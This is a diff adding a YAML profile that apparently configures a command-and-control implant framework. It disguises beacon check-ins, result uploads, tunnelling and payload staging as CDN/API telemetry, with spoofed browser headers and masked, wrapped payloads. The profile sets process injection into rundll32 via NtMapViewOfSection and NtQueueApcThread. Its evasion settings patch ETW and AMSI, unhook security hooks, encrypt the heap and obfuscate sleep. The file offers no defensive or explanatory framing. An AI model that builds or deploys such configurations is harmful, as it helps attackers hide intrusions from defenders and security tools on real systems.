@@ -1,0 +1,99 @@
+name: default
+description: Generic CDN/API telemetry mimicry with JSON wire transforms
+sleep_time: 60
+jitter: 20
+user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+
+http_get:
+  uri:
+    - /api/v1/checkin
+    - /cdn/status
+    - /assets/health
+  verb: GET
+  headers:
+    Accept: "application/json, text/plain, */*"
+    Accept-Language: "en-US,en;q=0.9"
+    Cache-Control: "no-cache"
+  body:
+    parameter: token
+    base64: true
+    mask: true
+  server_output:
+    base64: true
+    headers:
+      Content-Type: "application/json"
+      Cache-Control: "no-cache"
+
+http_post:
+  uri:
+    - /api/v1/register
+    - /api/v1/result
+    - /api/v1/tunnel
+  verb: POST
+  headers:
+    Content-Type: "application/json"
+    Accept: "*/*"
+  body:
+    base64: true
+    mask: true
+  server_output:
+    base64: true
+    headers:
+      Content-Type: "application/json"
+
+http_stager:
+  uri:
+    - /api/v1/stage
+    - /cdn/pkg
+  verb: GET
+
+spawn_to:
+  x86: "%windir%\\SysWOW64\\rundll32.exe"
+  x64: "%windir%\\System32\\rundll32.exe"
+
+process_inject:
+  alloc_type: NtMapViewOfSection
+  execute_type: NtQueueApcThread
+  use_syscalls: true
+
+evasion:
+  patch_etw: true
+  patch_amsi: true
+  unhook_on_load: true
+  heap_encrypt: true
+  syscall_method: indirect
+  sleep_technique: ekko
+  anti_analysis: false
+
+mutation:
+  uri_suffixes:
+    - ""
+    - /v2
+    - /v3
+    - /sync
+    - /status
+    - /health
+    - /data
+    - /verify
+  path_tokens:
+    - session
+    - token
+    - trace
+    - beacon
+    - client
+    - device
+  prepend_pool:
+    - '{"meta":{"v":1},"data":"'
+    - '<!-- '
+    - 'callback('
+  append_pool:
+    - '"}'
+    - ' -->'
+    - ');'
+  chrome_versions:
+    - "125.0.0.0"
+    - "126.0.0.0"
+    - "127.0.0.0"
+    - "128.0.0.0"
+    - "129.0.0.0"
+  mask_key_range: [1, 254]
